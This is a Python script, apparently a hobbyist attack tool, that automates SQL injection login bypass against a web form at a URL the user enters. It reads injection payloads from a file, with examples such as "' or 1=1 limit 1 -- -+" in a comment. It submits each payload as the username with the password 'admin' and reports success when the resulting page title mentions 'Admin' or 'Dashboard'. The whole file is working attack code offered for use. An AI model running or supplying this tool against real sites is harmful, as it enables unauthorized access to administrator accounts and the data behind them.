import sys
import mechanize
import bs4 as bs
print("""\033[1;36m┍━━━━━━━━━━━━━━━━━━━━━★━━━━━━━━━━━━━━━━━━━━┑\033[0m""")
print("""\033[1;36m|     \033[5;34m Creator>>   BR1N@n0\033[1;36m                 |\033[0m""")
print("""\033[1;36m|     \033[5;33m             RINNO  \033[1;36m                 |\033[0m""")
print("""\033[1;36m┕━━━━━━━━━━━━━━━━━━━━━★━━━━━━━━━━━━━━━━━━━━┙\033[0m""")
url=input("\033[32m[+]Enter your url::=>\033[0m")

#passq=['admin\'or 1=1 or \'\'=\'','\' or 1=1 limit 1 -- -+']
text1=['admin','Admin','Dashboard','Welcome Admin','Logged in as admin,','Admin Panel']

br = mechanize.Browser()
br.set_handle_robots(False)
br.addheaders =[('User-agent','mozilla')]
br.open(url)
for form in br.forms():
    print ("\033[1;34m>>",form,"\033[0m")

#fmain=input("Enter Form name::")
fuser=input("\033[35mForm for username to\nEnter=>")
fpass=input("\033[35mForm for Password to\nEnter=>")
file=open("bypass.txt","r")
data=file.read()
passq=data.splitlines()



for i in range(42):
    
    try:
        br.select_form(nr=0)
        br.form[fuser]=passq[i]
        br.form[fpass]='admin'
        br.submit()
    except mechanize._form_controls.ControlNotFoundError:
        print ("\033[1;36msomething wrong,\nYou should check \033[2;31mForm Name\033[0m")
        sys.exit()

    except mechanize._mechanize.FormNotFoundError:
        print ("\033[5;36m________________________________\n[+==+]Found___[\033[0m\033[1;32m"+passq[i-1]+"\033[1;0m")
                
        sys.exit()
    else:
        

        #print (br.response().read().decode('UTF-8'))
        res=br.response().read().decode('UTF-8')
        soup =bs.BeautifulSoup(res,"html.parser")
        data =soup.title.string
        equal=data.split(" ")
        for info in text1:
            if info in equal:
                print ("\033[5;36m________________________________\n[+==+]Found___[\033[0m\033[1;32m"+passq[i]+"\033[1;0m")
                
                sys.exit()
            else:
                print("\033[1;31m[+==+]Not Found=>___[",passq[i],"\033[0m",end="\r")
